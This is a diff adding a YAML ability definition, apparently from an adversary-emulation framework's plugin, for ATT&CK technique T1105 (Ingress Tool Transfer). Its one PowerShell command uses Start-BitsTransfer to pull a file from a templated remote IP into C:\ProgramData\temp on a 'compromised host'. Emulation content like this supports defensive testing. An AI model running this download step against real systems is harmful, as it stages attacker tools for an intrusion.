@@ -1,0 +1,31 @@
+ability_id: a750b196-8168-461a-8747-bdc4add107ac
+access: {}
+additional_info: {}
+buckets:
+- discovery
+delete_payload: true
+description: Pushing tools to compromised host
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: Start-BitsTransfer -Source "http://#{bitsadmin_remote_ip}/#{bitsadmin_b64_encoded_string}"
+    -Destination "C:\ProgramData\temp\#{bitsadmin_b64_encoded_string}"
+  language: null
+  name: psh
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Ingress Tool Transfer
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: discovery
+technique_id: T1105
+technique_name: Ingress Tool Transfer
